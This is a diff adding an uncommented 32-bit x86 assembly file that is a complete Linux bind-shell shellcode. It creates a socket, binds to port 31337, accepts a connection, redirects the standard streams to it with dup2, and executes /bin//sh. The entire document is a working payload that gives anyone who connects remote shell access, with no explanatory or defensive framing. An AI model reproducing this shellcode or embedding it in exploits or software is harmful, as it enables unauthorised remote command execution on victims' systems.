@@ -1,0 +1,71 @@
+BITS 32
+
+
+  push BYTE 0x66   
+  pop eax
+  cdq               
+  xor ebx, ebx     
+  inc ebx          
+  push edx        
+  push BYTE 0x1     
+  push BYTE 0x2    
+  mov ecx, esp     
+  int 0x80       
+  
+  mov esi, eax     
+
+
+  push BYTE 0x66   
+  pop eax
+  inc ebx          
+  push edx          
+  push WORD 0x697a  
+  push WORD bx     
+  mov ecx, esp     
+  push BYTE 16      
+  push ecx         
+  push esi         
+  mov ecx, esp     
+  int 0x80        
+
+
+  mov BYTE al, 0x66
+  inc ebx
+  inc ebx          
+  push ebx          
+  push esi         
+  mov ecx, esp     
+  int 0x80
+
+
+  mov BYTE al, 0x66 
+  inc ebx           
+  push edx          
+  push edx        
+  push esi         
+  mov ecx, esp      
+  int 0x80        
+
+
+  mov ebx, eax   
+  push BYTE 0x3F   
+  pop eax
+  xor ecx, ecx    
+  int 0x80        
+  mov BYTE al, 0x3F
+  inc ecx          
+  int 0x80        
+  mov BYTE al, 0x3F 
+  inc ecx        
+  int 0x80         
+
+  mov BYTE al, 11  
+  push edx        
+  push 0x68732f2f 
+  push 0x6e69622f 
+  mov ebx, esp     
+  push edx        
+  mov edx, esp   
+  push ebx       
+  mov ecx, esp   
+  int 0x80       
